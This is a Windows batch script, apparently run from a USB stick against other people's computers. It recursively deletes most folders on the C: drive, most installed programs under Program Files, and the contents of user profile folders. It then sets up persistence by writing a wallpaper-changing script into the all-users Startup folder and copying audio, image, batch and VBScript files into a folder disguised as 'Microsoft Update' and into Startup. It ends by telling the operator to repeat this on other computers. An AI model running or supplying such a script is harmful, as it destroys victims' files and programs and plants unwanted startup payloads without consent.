c:
cd /
for /D %%I in (*) do if /I not "%%I"=="Windows" if /I not "%%I"=="Users" if /I not "%%I"=="Program Files (x86)" if /I not "%%I"=="Program Files" del /s /q "%%I"
cd C:/"Program Files (x86)"
for /D %%I in (*) do if /I not "%%I"=="Common Files" if /I not "%%I"=="Microsoft" if /I not "%%I"=="Microsoft.NET" if /I not "%%I"=="Windows Defender" if /I not "%%I"=="Windows Mail" if /I not "%%I"=="Windows Media Player" if /I not "%%I"=="Windows NT" if /I not "%%I"=="Windows Photo Viewer" if /I not "%%I"=="WindowsPowerShell" del /s /q "%%I"
cd C:/"Program Files"
for /D %%I in (*) do if /I not "%%I"=="Common Files" if /I not "%%I"=="Windows Defender" if /I not "%%I"=="Windows Mail" if /I not "%%I"=="Windows Media Player" if /I not "%%I"=="Windows NT" if /I not "%%I"=="Windows Photo Viewer" if /I not "%%I"=="WindowsPowerShell" del /s /q "%%I"
cd C:/Users/%username%
for /D %%A in (*) do (
    cd "%%A"
    del * /s /q | for /D %%p IN (*) DO rmdir "%%p" /s /q
    cd ..
)

(
echo set "wallpaperPath="C:/Users/%username%/AppData/Local/Microsoft Update/thumboi.png"
echo reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaperPath%" /f
echo RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
) > "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/wallpaper.bat"

cd C:/Users/%username/AppData/Local
mkdir "Microsoft Update"
copy "%~d0/funnyahhaudio.wav" "C:/Users/%username%/AppData/Local/Microsoft Update"
copy "%~d0/audio.bat" "C:/Users/%username%/AppData/Local/Microsoft Update"
copy "%~d0/hehe.vbs" "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"
copy "%~d0/thumboi.png" "C:/Users/%username%/AppData/Local/Microsoft Update"
copy "%~d0/thumb.bat" "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"
echo Injection complete! you may shutdown, remove the usb and repeat with other computers. Press any key to exit...
pause >nul


